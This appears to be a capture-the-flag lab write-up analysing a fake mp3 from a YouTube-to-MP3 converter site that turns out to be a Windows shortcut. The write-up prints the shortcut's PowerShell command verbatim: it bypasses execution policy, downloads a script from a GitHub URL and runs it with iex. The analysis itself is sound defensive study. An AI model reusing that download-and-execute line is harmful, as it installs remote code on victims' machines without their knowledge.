**Youtube to mp3 converter websites**

These websites have been around for a long time. They offer a convenient way to extract audio from YouTube videos, making them popular. However, historically, these websites have been observed to have significant risks, such as:

- **Malvertising**: Many sites contain malicious ads that can exploit vulnerabilities in a user's system, which could lead to infection.
- **Phishing¬†scams**: Users can be tricked into providing personal or sensitive information via fake surveys or offers.
- **Bundled malware**: Some converters may come with malware, tricking users into unknowingly running it.

1. Converted a youtube url and downloaded it
2. Came in a download.zip (which shouldn‚Äôt be the case if it‚Äôs just downloading a mp3 file)
3. Extracted 2 mp3 files (somg.mp3 and song.mp3) 

1. Determine file contents `file <file name>`

song.mp3 output seems normal

somg.mp3 output seems to have a MS Windows shortcut (.lnk) file.

1. Inspect somg.mp3 file `exiftool <file name>`

```jsx
-ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('[https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\\ProgramData\\s.ps1](https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:%5C%5CProgramData%5C%5Cs.ps1)'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
```

`-ep Bypass -nop` flags disable PowerShells‚Äôs usual restrictions, allowing scripts to run without interference from security settings or user profiles

`DownloadFile` method pulls a file (`IS.ps1` ) from a remote server in github and saves to `C:\\ProgramData\\` directory on the target machine

Once downloaded, the script is executed with PowerShell using the `iex` command, which triggers the downloaded `s.ps1` file.
